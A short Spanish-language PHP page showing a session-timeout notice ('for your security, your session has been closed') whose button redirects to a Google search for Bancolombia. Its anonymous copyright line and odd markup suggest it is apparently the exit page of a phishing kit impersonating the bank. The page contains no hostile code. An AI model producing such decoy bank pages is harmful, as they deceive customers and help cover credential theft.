<?php require_once("header.php"); ?>
  <div class="container">
    <div class="mensaje" style="text-align: center;" >
      <p>No se ha detectado actividad en los últimos 7 minutos.</p>
      <p>Por su seguridad, su sesión se ha cerrado.</p>
      <button class="motoconcho" onclick="redireccionar()">Continuar</button>
    </div>
    <div class="mensaje-derecha" style=" text-align: right; font-size: 10px; "  >
      <p>copyright &copy; <span id="year"></span> S.A.</p>
    </div>
  </div>
  <script>
    document.getElementById("year").textContent = new Date().getFullYear();
    document.addEventListener("DOMContentLoaded", function() {
      var tituloInicioSesionElement = document.querySelector(".grotesca-papel");
      // Establecer el mensaje predeterminado
      tituloInicioSesionElement.textContent = "Mensaje informativo";
    });
    function redireccionar() {
      window.location.href = "https://www.google.com/search?q=bancolombia&rlz=1C1YTUH_esCO1045CO1045&oq=bancol&gs_lcrp=EgZjaHJvbWUqDAgAECMYJxiABBiKBTIMCAAQIxgnGIAEGIoFMhMIARAuGMcBGLEDGMkDGNEDGIAEMgYIAhBFGEAyBggDEEUYOTIGCAQQRRg8MgYIBRBFGDwyBggGEEUYPDIGCAcQRRg8qAIAsAIA&sourceid=chrome&ie=UTF-8";
    }
  </script>

